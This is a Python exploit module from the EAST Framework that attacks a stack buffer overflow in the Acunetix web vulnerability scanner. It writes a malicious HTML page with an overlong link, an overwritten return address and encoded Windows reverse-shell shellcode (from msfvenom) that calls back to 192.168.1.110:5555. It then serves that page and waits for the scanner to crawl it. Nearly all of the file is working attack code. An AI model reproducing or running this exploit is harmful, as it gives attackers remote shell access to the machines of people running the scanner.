#!/usr/bin/env python
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import re
import os
import urllib2
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
sys.path.append("./core")
sys.path.append("./shellcodes")
from Sploit import Sploit
from Shellcodes import OSShellcodes
INFO={}
INFO['NAME']="ef_acunetix_sbo"
INFO['DESCRIPTION']="Acunetix Web vulnerability scanner stack buffer overflow"
INFO['VENDOR']="https://www.acunetix.com/"
INFO["CVE Name"]="N/A"
INFO["NOTES"]="""
    Stack buffer overflow
    """
INFO['CHANGELOG']="10 Aug, 2015. Written by Gleg team."
INFO['PATH'] = 'Modules/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["SELFHOST"] = "192.168.1.233"
OPTIONS["SELFPORT"] = "5555"

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header('Server','Gleg')
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            size = os.path.getsize('Evil.htm')
            self.send_header('Content-length', size)
            f = open('Evil.htm', 'r')
            self.end_headers()
            self.wfile.write(f.read())
            print f.read()
            f.close()
            print 'UPLOAD SUCCEDED'
            return
        except Exception as e:
            print e

class exploit(Sploit):
    def __init__(self,host="",
                port=0,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = 4000
        self.host = "192.168.1.110"
        self.name = INFO['NAME']
        self.state = "running"
        return

    def args(self):
        self.my_server_ip = "192.168.1.110"
        self.my_server_port = 80
        self.args = Sploit.args(self, OPTIONS)
        return

    def check(self):
       # can not check
       return 1
    def run(self):
        self.args()
        if not self.check():
            self.log( "Testing didn't find vulnerable target" )
            self.setInfo( "%s attacking %s:%d - (Failed!)" % ( NAME, self.host, self.port ), showlog = 1 )
            self.finish(False)
            return 0
        head = ("<html>\
            <body>\
            <center><h1>EaST Framework v 0.6</h1></center><br>")
        junk = "<a href= \"http://"
        junk += "A"*268
        edx = "500f"
        junk2 = "BBBB"
        eip = "\x49\x63\x52\x4d"
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=192.168.1.110 lport=5555 -e x86/alpha_mixed BufferRegister=ESP -f python
        buf =  ""
        buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
        buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
        buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
        buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
        buf += "\x79\x6c\x68\x68\x4b\x32\x33\x30\x63\x30\x67\x70\x75"
        buf += "\x30\x6e\x69\x79\x75\x46\x51\x49\x50\x31\x74\x4e\x6b"
        buf += "\x42\x70\x50\x30\x4e\x6b\x50\x52\x34\x4c\x4c\x4b\x72"
        buf += "\x72\x32\x34\x4c\x4b\x44\x32\x36\x48\x54\x4f\x78\x37"
        buf += "\x51\x5a\x65\x76\x65\x61\x39\x6f\x4e\x4c\x65\x6c\x65"
        buf += "\x31\x33\x4c\x66\x62\x46\x4c\x45\x70\x39\x51\x58\x4f"
        buf += "\x66\x6d\x53\x31\x7a\x67\x4a\x42\x4a\x52\x42\x72\x46"
        buf += "\x37\x6e\x6b\x33\x62\x42\x30\x6c\x4b\x72\x6a\x57\x4c"
        buf += "\x4e\x6b\x32\x6c\x72\x31\x42\x58\x5a\x43\x61\x58\x66"
        buf += "\x61\x4e\x31\x33\x61\x6c\x4b\x70\x59\x47\x50\x76\x61"
        buf += "\x7a\x73\x6e\x6b\x52\x69\x37\x68\x39\x73\x45\x6a\x62"
        buf += "\x69\x6e\x6b\x57\x44\x6e\x6b\x76\x61\x59\x46\x45\x61"
        buf += "\x79\x6f\x4e\x4c\x59\x51\x68\x4f\x74\x4d\x76\x61\x69"
        buf += "\x57\x35\x68\x39\x70\x62\x55\x6b\x46\x77\x73\x31\x6d"
        buf += "\x49\x68\x55\x6b\x33\x4d\x44\x64\x50\x75\x49\x74\x72"
        buf += "\x78\x6c\x4b\x63\x68\x31\x34\x47\x71\x48\x53\x70\x66"
        buf += "\x4e\x6b\x74\x4c\x70\x4b\x4c\x4b\x66\x38\x45\x4c\x46"
        buf += "\x61\x6a\x73\x4e\x6b\x46\x64\x6e\x6b\x77\x71\x5a\x70"
        buf += "\x4c\x49\x73\x74\x44\x64\x74\x64\x61\x4b\x53\x6b\x33"
        buf += "\x51\x33\x69\x61\x4a\x62\x71\x4b\x4f\x59\x70\x73\x6f"
        buf += "\x61\x4f\x73\x6a\x6c\x4b\x37\x62\x7a\x4b\x6c\x4d\x51"
        buf += "\x4d\x61\x78\x47\x43\x47\x42\x45\x50\x53\x30\x33\x58"
        buf += "\x31\x67\x62\x53\x66\x52\x73\x6f\x51\x44\x50\x68\x72"
        buf += "\x6c\x73\x47\x66\x46\x67\x77\x39\x6f\x7a\x75\x4f\x48"
        buf += "\x7a\x30\x36\x61\x37\x70\x57\x70\x56\x49\x69\x54\x62"
        buf += "\x74\x46\x30\x32\x48\x64\x69\x4b\x30\x32\x4b\x43\x30"
        buf += "\x79\x6f\x68\x55\x70\x50\x42\x70\x42\x70\x30\x50\x51"
        buf += "\x50\x70\x50\x67\x30\x66\x30\x65\x38\x4a\x4a\x56\x6f"
        buf += "\x6b\x6f\x39\x70\x39\x6f\x78\x55\x4e\x77\x61\x7a\x44"
        buf += "\x45\x43\x58\x39\x50\x6d\x78\x53\x31\x70\x6e\x61\x78"
        buf += "\x34\x42\x73\x30\x62\x35\x48\x33\x6b\x39\x5a\x46\x63"
        buf += "\x5a\x76\x70\x52\x76\x76\x37\x50\x68\x6d\x49\x49\x35"
        buf += "\x74\x34\x50\x61\x49\x6f\x78\x55\x6c\x45\x6f\x30\x72"
        buf += "\x54\x64\x4c\x49\x6f\x42\x6e\x37\x78\x32\x55\x48\x6c"
        buf += "\x72\x48\x78\x70\x58\x35\x4f\x52\x42\x76\x59\x6f\x39"
        buf += "\x45\x53\x58\x50\x63\x62\x4d\x61\x74\x43\x30\x6e\x69"
        buf += "\x4d\x33\x76\x37\x52\x77\x52\x77\x46\x51\x79\x66\x50"
        buf += "\x6a\x65\x42\x42\x79\x63\x66\x7a\x42\x6b\x4d\x73\x56"
        buf += "\x59\x57\x52\x64\x37\x54\x55\x6c\x57\x71\x35\x51\x6e"
        buf += "\x6d\x57\x34\x71\x34\x34\x50\x4b\x76\x55\x50\x52\x64"
        buf += "\x52\x74\x46\x30\x61\x46\x31\x46\x63\x66\x62\x66\x53"
        buf += "\x66\x30\x4e\x31\x46\x36\x36\x50\x53\x31\x46\x33\x58"
        buf += "\x42\x59\x6a\x6c\x37\x4f\x4b\x36\x6b\x4f\x4a\x75\x6e"
        buf += "\x69\x39\x70\x30\x4e\x33\x66\x47\x36\x6b\x4f\x66\x50"
        buf += "\x61\x78\x64\x48\x6c\x47\x47\x6d\x31\x70\x6b\x4f\x5a"
        buf += "\x75\x4d\x6b\x68\x70\x78\x35\x69\x32\x32\x76\x52\x48"
        buf += "\x4d\x76\x4d\x45\x4d\x6d\x6f\x6d\x79\x6f\x68\x55\x65"
        buf += "\x6c\x35\x56\x73\x4c\x66\x6a\x6d\x50\x6b\x4b\x6b\x50"
        buf += "\x72\x55\x67\x75\x6f\x4b\x73\x77\x66\x73\x31\x62\x62"
        buf += "\x4f\x63\x5a\x53\x30\x43\x63\x59\x6f\x79\x45\x41\x41"

        tail = "\"></a></body></html>"
        exploit = head + junk + edx + junk2 + eip + buf  + tail
        self.log("writing html file...")
        try:
            f = open("Evil.htm", "w")
            f.write(exploit)
            f.close()
        except Exception, e:
            self.log("Can not write file")
            self.finish(False)
            return 0
        self.log( "Done. now waiting when acunetix check this site http://" + self.my_server_ip + ":" + str(self.my_server_port) +"/Evil.htm" )
        #self.setInfo( "%s attacking %s:%d - (Success!)" % ( NAME, self.host, self.port ) )
        try:
            serv = HTTPServer((self.my_server_ip, self.my_server_port), MyHandler)
            self.log("Server waiting for scan")
            serv.serve_forever()
        except KeyboardInterrupt:
            self.log("Closing server")
            serv.socket.close()
        self.finish(True)
        return 1

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
